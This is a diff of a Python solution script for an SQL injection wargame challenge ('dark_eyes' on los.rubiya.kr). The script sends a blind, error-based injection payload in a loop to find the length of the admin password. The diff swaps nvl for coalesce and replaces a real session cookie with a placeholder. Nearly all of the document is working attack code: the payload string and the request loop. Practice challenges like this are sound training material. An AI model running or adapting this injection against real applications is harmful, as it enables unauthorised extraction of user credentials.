@@ -2,13 +2,13 @@
 import requests
 
 url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="
-head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}
+head = {'Cookie' : 'PHPSESSID=값'}
 
 length = 1
 pwd = ''
 
 while (1):
-    query = "' or id='admin' and nvl((select id where id='admin' and length(pw)='{}'),(select 1 union select 2))%23".format(length)
+    query = "' or id='admin' and coalesce((select id where id='admin' and length(pw)='{}'),(select 1 union select 2))%23".format(length)
     req = requests.get(url+query, headers=head)
     print("[ +",length,"]")
     if "query" in req.text:
